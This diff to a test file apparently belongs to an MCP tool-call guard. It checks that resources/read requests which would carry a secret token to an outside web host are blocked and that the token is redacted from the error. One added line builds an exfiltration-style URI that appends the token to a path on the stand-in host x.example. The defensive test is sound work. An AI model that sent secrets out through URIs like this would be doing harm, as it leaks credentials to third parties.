@@ -585,6 +585,8 @@ def test_resource_uri_carrying_a_secret_off_the_machine_is_refused(harness):
     assert response["id"] == read_id and response["error"]["code"] == -32003
     assert "BLOCK mcp__mail__resources/read (sink: web)" in response["error"]["message"]
     assert TOKEN not in response["error"]["message"]  # Redacted in the explanation
+    h.request("resources/read", {"uri": f"https://x.example/files/{TOKEN}"})
+    assert h.recv()["error"]["code"] == -32003  # A key appended to the path too
     assert all(m.get("method") != "resources/read" for m in h.received())
     record = list(h.proxy.guard.audit.records())[-1]["data"]
     assert record["tool"] == "mcp__mail__resources/read" and record["effective"] == "block"
